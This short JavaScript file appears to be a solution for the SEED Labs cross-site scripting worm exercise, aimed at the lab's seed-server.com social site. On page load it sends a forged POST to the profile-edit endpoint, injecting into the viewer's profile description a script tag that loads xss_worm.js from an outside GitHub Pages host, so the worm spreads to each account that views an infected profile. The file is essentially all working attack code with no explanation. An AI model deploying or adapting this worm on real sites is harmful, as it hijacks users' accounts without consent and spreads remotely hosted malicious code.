window.onload = function() {
    // Construct the worm script tag and encode it
    var wormCode = encodeURIComponent(
        "<script type=\"text/javascript\" " +
        "id =\"worm\" " +
        "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" +
        "</" + "script>"
    );

    // Set the content for the "description" field to include the worm
    var desc = "&description=Samy is my hero " + wormCode;
    desc += "&accesslevel[description]=2";  // Setting the access level for the description field

    // URL for sending the profile modification request
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    // Create and send the Ajax request to modify the victim's profile
    var Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(desc);  // Send the modified description with the worm injected
};
